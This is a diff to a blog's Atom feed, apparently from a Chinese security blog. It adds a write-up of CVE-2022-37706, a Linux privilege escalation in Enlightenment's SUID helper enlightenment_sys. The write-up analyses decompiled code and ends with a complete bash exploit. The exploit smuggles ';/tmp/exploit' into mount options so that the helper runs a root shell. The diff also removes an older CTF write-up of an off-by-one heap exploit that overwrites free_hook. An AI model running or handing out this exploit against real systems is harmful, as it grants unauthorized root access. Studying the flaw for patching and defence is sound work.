@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-10-01T18:47:17.993Z</updated>
+  <updated>2022-10-05T18:41:18.464Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2022-37706</title>
+    <link href="http://example.com/2022/10/06/Linux%E6%8F%90%E6%9D%83CVE-2022-37706/"/>
+    <id>http://example.com/2022/10/06/Linux%E6%8F%90%E6%9D%83CVE-2022-37706/</id>
+    <published>2022-10-05T18:39:12.195Z</published>
+    <updated>2022-10-05T18:41:18.464Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="CVE-2022-37706"><a href="#CVE-2022-37706" class="headerlink" title="CVE-2022-37706"></a>CVE-2022-37706</h1><p>这是一个Linux上的提权漏洞</p><p>先需要安装 apt install enlightenment </p><p>/usr/lib/x86_64-linux-gnu/enlightenment/utils/ 下的 enlightenment_sys 文件 其中就包含了一段可以利用的提权代码。</p><pre><code>  eina_init();  uid = getuid();  v56 = getgid();  LODWORD(v57) = getegid();  v11 = getgroups(0x10000, v64);  if ( v11 &lt; 0 )  &#123;    puts(&quot;ERROR: MEMBER OF MORE THAN 65536 GROUPS&quot;);    exit(3);  &#125;  v58 = v11;  if ( setuid(0) )  &#123;    puts(&quot;ERROR: UNABLE TO ASSUME ROOT PRIVILEGES&quot;);// 提升了它的特权。    exit(5);  &#125;  v12 = setgid(0);  if ( v12 )  &#123;    puts(&quot;ERROR: UNABLE TO ASSUME ROOT GROUP PRIVILEGES&quot;);    exit(7);  &#125;</code></pre><p>我们的想法就是想办法执行这段代码后，通过执行system(“/bin/sh”) 来提权并getshell</p><p><img src="https://s2.loli.net/2022/10/06/cUHE3CWfSz17iGD.png"></p><p>这一段就是在判断传入的参数是否为help 我们不用管他，不传入help即可。</p><p><img src="https://s2.loli.net/2022/10/06/k3zLef5ngjHFb8i.png"></p><p>v7是被/阶段后的字符串它将会被再次截断 来与 mount 进行比较从而进入 if 。</p><p>/bin/mount 实际上是 linux 的文件目录，在之后会通过文件查找来搜索该路径，所以我们的<strong>第一个参数</strong>就是 /bin/mount</p><p><img src="https://s2.loli.net/2022/10/06/Afy9WFkI6JGCplT.png"></p><p>然后就进入了提权的代码段</p><p><img src="https://s2.loli.net/2022/10/06/wu8EUsczRVlTDqh.png"></p><p><img src="https://s2.loli.net/2022/10/06/hNQWym1FXY6G3gt.png"></p><p>删除了很多环境变量，这是<br>安全预防措施以不<br>调用另一个非预期的二进制文件。</p><p><img src="https://s2.loli.net/2022/10/06/E8ZOwslAStFeTB3.png"></p><p>然后来到了299行附近。这里我们需要让main函数的第一个参数为 6 .</p><p>if ( *v26 == 45 &amp;&amp; !strcmp(v26, “-o”) &amp;&amp; (eina_strlcpy)(v68, parameter_2[3], 64LL) &lt;= 63 )</p><p>由上面这句可以发现 <strong>第二个参数</strong>需要为 -o</p><p><img src="https://s2.loli.net/2022/10/06/JQmc1u2RXTNOwve.png"></p><p>然后进入while循环，通过调整传入参数的顺序来让 v54 v28 v56 都被赋值，并且最后进入下面这个else if 后的结果是 -1&amp;-1&amp;-1&amp;-1从而进入接下来 的函数</p><p>观察代码可以发现，每经过一次循环就截断一次v29，并进行赋值或比较。而v29的来源正是 传入的<strong>第三个参数</strong></p><pre><code>else if ( strncmp(v29, &quot;utf8,&quot;, 5uLL)         &amp;&amp; strncmp(v29, &quot;utf8=0,&quot;, 7uLL)         &amp;&amp; strncmp(v29, &quot;utf8=1,&quot;, 7uLL)         &amp;&amp; strncmp(v29, &quot;iocharset=utf8,&quot;, 0xFuLL) )</code></pre><p>所以第三个参数是  </p><p>noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), “/dev/../tmp/;/tmp/exploit”</p><p>后面这个部分是需要我们创建的文件路径，这是为getshell做准备的。</p><p><img src="https://s2.loli.net/2022/10/06/R4EQgNZtk3a2To1.png"></p><p>来到350行附近，第348行的if我们是不会进入的，但v49是 传入的第四个参数。 由441行可知 ，它的前5个字节必须要是 /dev/ </p><p><img src="https://s2.loli.net/2022/10/06/czaUZCEs1AGNmRO.png"></p><p>由375行可以发现v51和v50的地址要相差6，所以最终的 <strong>第四个参数</strong> 是 /tmp///net</p><p>最后程序将检测 /dev/net 目录是否存在</p><p>所以我们需要创建目录 mkdir -p /tmp/net</p><p>为了获取system的参数，先创建文件路径 mkdir -p “/dev/../tmp/;/tmp/exploit” </p><p>当system 获取的参数是 noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), “/dev/../tmp/;/tmp/exploit” </p><p>由于 eina_strbuf_append_printf() 它变成了 /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), /dev/../tmp/;/tmp/exploit /tmp///net 这里去掉了 “” </p><p>由于; 会执行system 的参数是 /tmp/exploit </p><p>可以利用重定向，将 /tmp/exploit 重定向为  “/bin/sh”</p><p>最终完成提权，并且getshell</p><p>exp如下</p><pre><code>#!/bin/bashecho &quot;CVE-2022-37706&quot;echo &quot;[*] Trying to find the vulnerable SUID file...&quot;echo &quot;[*] This may take few seconds...&quot;file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1)if [[ -z $&#123;file&#125; ]]then    echo &quot;[-] Couldn&#39;t find the vulnerable SUID file...&quot;    echo &quot;[*] Enlightenment should be installed on your system.&quot;    exit 1fiecho &quot;[+] Vulnerable SUID binary found!&quot;echo &quot;[+] Trying to pop a root shell!&quot;mkdir -p /tmp/netmkdir -p &quot;/dev/../tmp/;/tmp/exploit&quot;echo &quot;/bin/sh&quot; &gt; /tmp/exploitchmod a+x /tmp/exploitecho &quot;[+] Enjoy the root shell :)&quot;$&#123;file&#125; /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), &quot;/dev/../tmp/;/tmp/exploit&quot; /tmp///net</code></pre><p><img src="https://s2.loli.net/2022/10/05/eMTog7Qb3iwHz8I.png"><br><img src="https://s2.loli.net/2022/10/05/DReSq91PyJoEdu4.png"><br><img src="https://s2.loli.net/2022/10/05/B3rOUnQ8g7tbTY1.png"><br><img src="https://s2.loli.net/2022/10/05/SAkWJzLrcmayBb9.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;CVE-2022-37706&quot;&gt;&lt;a href=&quot;#CVE-2022-37706&quot; class=&quot;headerlink&quot; title=&quot;CVE-2022-37706&quot;&gt;&lt;/a&gt;CVE-2022-37706&lt;/h1&gt;&lt;p&gt;这是一个Linux上的提权漏洞&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>CVE-2018-18708</title>
@@ -409,29 +430,6 @@ tcache_get (size_t tc_i</summary>
       
       
     <summary type="html">&lt;h2 id=&quot;web题&quot;&gt;&lt;a href=&quot;#web题&quot; class=&quot;headerlink&quot; title=&quot;web题&quot;&gt;&lt;/a&gt;web题&lt;/h2&gt;&lt;h3 id=&quot;1-朋友的学妹&quot;&gt;&lt;a href=&quot;#1-朋友的学妹&quot; class=&quot;headerlink&quot; title=&quot;1.朋</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ctf-wiki</title>
-    <link href="http://example.com/2022/10/01/ctf-wiki/"/>
-    <id>http://example.com/2022/10/01/ctf-wiki/</id>
-    <published>2022-10-01T09:33:18.630Z</published>
-    <updated>2021-09-24T06:49:36.303Z</updated>
-    
-    <content type="html"><![CDATA[<p>#ctf-wiki</p><p>##off-by-one</p><p>1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。</p><p>2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</p><p>下面以该题作为演示</p><p>Asis CTF 2016 b00ks</p><pre><code>__int64 __fastcall over_one(_BYTE *chunk, int size)&#123;  int i; // [rsp+14h] [rbp-Ch]  if ( size &lt;= 0 )    return 0LL;  for ( i = 0; ; ++i )  &#123;    if ( read(0, chunk, 1uLL) != 1 )      return 1LL;    if ( *chunk == 10 )      break;    ++chunk;    if ( i == size )      break;  &#125;  *chunk = 0;  return 0LL;&#125;</code></pre><p>这里最后有NULL溢出。</p><pre><code>.data:0000000000202010 chunk_array     dq offset unk_202060    ; DATA XREF: find_temp:loc_B38↑o.data:0000000000202010                                         ; delet:loc_C1B↑o ....data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change+15↑o</code></pre><p>这里可以发现off_202018（author）与chunk_array只相差了0x20个字，因此我们可以写入0x20个字符，然后打印溢出chunk_array所存储的地址。</p><p>关键的地方来了，我们可以通过适当的调整size大小，使得prt_des的后两位正好是00，然后再修改author，使得chunk_array【0】指向了ptr_des。若此时我们再在des中伪造了一个结构体,并使chunk_array可以索引到book2,这样就形成了堆重叠。可以分配edit book1 ，book2来修改free_hook。</p><p>那么我们先create两个book,经过调试发现，当name_size为0x20时ptr_des的位置符合需求。而第二个book有通过vmmap泄露libc_base 的功能，所以需要很大的空间，使系统单独映射一段内存从而泄露libc</p><p>1.首先通过填满author泄露chunk_array【1】所存储的struct_book1 的地址。</p><p><img src="https://i.loli.net/2021/09/24/f84RvlpVqoTgK2B.png"></p><p>2.在book1的des段填充数据使其存储book2的ptr_name ptr_des</p><p>3.然后通过打印泄露出book2的各种地址</p><p>4.之后再次填充author使得chunk_array【1】指向了book1的des段。</p><p>5.最后edit_book1写入free_hook,再edit_book2写入one_gadget,然后执行free函数即可get_shell</p><p><img src="https://i.loli.net/2021/09/24/UawSy1PYnF47cbT.png"></p><p>调试libc偏移</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;#ctf-wiki&lt;/p&gt;
-&lt;p&gt;##off-by-one&lt;/p&gt;
-&lt;p&gt;1-只能修改一个字节，溢出可控字节，通过修改堆块大小造成堆重叠从而覆盖或泄露其他数据。&lt;/p&gt;
-&lt;p&gt;2-溢出NULL字节可以使prev_inuse位被清0，前块会被认为是free块，从而造成堆重叠。</summary>
       
     
     
